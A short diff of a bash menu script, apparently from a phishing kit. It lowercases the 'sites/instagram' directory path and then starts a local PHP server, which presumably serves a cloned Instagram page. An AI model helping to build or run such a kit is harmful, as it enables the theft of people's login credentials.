@@ -49,8 +49,8 @@ echo ""
 read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
 		 case $option in 
 			 
-                1) cd Sites/
-                  cd Instagram/
+                1) cd sites/
+                  cd instagram/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
